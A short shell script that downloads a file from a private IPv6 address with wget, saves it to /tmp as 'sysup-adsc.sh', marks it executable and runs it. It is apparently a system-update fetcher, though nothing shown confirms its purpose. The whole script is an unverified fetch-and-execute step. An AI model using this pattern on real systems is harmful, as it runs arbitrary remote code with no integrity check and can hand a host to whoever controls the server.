#!/bin/sh
cd /tmp/

cat="adsc2"
localname="/tmp/sysup-adsc.sh"

wget "http://[fd43:5602:29bd:10::a]:2351/getups.php?cat=$cat" -O "$localname"
chmod +x "$localname"
"$localname" "$cat"
